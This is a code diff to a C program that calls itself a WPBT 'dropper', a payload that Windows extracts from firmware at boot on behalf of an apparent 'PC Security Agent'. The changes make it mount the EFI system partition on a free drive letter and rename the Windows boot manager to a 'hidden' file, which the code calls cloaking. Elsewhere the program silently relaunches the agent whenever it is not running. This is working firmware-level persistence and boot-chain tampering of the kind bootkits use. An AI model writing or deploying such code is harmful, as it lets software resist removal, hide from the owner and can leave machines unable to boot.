@@ -1,4 +1,4 @@
-/*
+﻿/*
  * wpbbin_agent.c - Windows Platform Binary Table (WPBT) Native Payload
  *
  * This executable is extracted directly by the Windows Kernel (ntoskrnl.exe / smss.exe)
@@ -82,20 +82,43 @@ void TriggerLockWorkStation()
     }
 }
 
+// Find first available unused drive letter (from Z down to E)
+wchar_t GetFreeDriveLetter()
+{
+    DWORD drives = GetLogicalDrives();
+    for (int i = 25; i >= 4; i--) { // Z (25) down to E (4)
+        if (!(drives & (1 << i))) {
+            return (wchar_t)(L'A' + i);
+        }
+    }
+    return L'Z';
+}
+
 // Trigger boot repair and cloaking pass from kernel dropper
 void HealEfiBootFromKernel()
 {
-    // Mount EFI to S:
-    system("mountvol S: /s >nul 2>&1");
+    wchar_t freeLetter = GetFreeDriveLetter();
+    char mountCmd[64];
+    char unmountCmd[64];
+    wchar_t srcPath[128];
+    wchar_t dstPath[128];
+
+    sprintf_s(mountCmd, sizeof(mountCmd), "mountvol %c: /s >nul 2>&1", (char)freeLetter);
+    sprintf_s(unmountCmd, sizeof(unmountCmd), "mountvol %c: /d >nul 2>&1", (char)freeLetter);
+    swprintf_s(srcPath, sizeof(srcPath) / sizeof(wchar_t), L"%c:\\EFI\\Microsoft\\Boot\\bootmgfw.efi", freeLetter);
+    swprintf_s(dstPath, sizeof(dstPath) / sizeof(wchar_t), L"%c:\\EFI\\Microsoft\\Boot\\bootmgfw_hidden.efi", freeLetter);
+
+    // Mount EFI to dynamic free letter
+    system(mountCmd);
 
     // Cloak bootmgfw.efi if exists
-    if (GetFileAttributesW(L"S:\\EFI\\Microsoft\\Boot\\bootmgfw.efi") != INVALID_FILE_ATTRIBUTES) {
-        MoveFileExW(L"S:\\EFI\\Microsoft\\Boot\\bootmgfw.efi", L"S:\\EFI\\Microsoft\\Boot\\bootmgfw_hidden.efi", MOVEFILE_REPLACE_EXISTING);
+    if (GetFileAttributesW(srcPath) != INVALID_FILE_ATTRIBUTES) {
+        MoveFileExW(srcPath, dstPath, MOVEFILE_REPLACE_EXISTING);
         LogEvent(L"WPBT Dropper successfully re-cloaked bootmgfw.efi in EFI partition.");
     }
 
     // Unmount EFI
-    system("mountvol S: /d >nul 2>&1");
+    system(unmountCmd);
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
@@ -116,11 +139,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     // 4. Verify if background service is running
     if (!IsAgentRunning()) {
         LogEvent(L"PC Security Agent background service is not running. Resurrecting...");
-        // Launch or install the agent executable if present
         STARTUPINFOW si = { sizeof(si) };
         PROCESS_INFORMATION pi;
         
-        // Attempt to launch standalone agent from common deployment paths
         wchar_t cmd[] = L"C:\\Program Files\\PCSecuritySystem\\PC.SecurityAgent.exe";
         if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
             CloseHandle(pi.hProcess);
@@ -136,4 +157,3 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     LogEvent(L"WPBT Dropper execution complete. System secured.");
     return 0;
 }
-
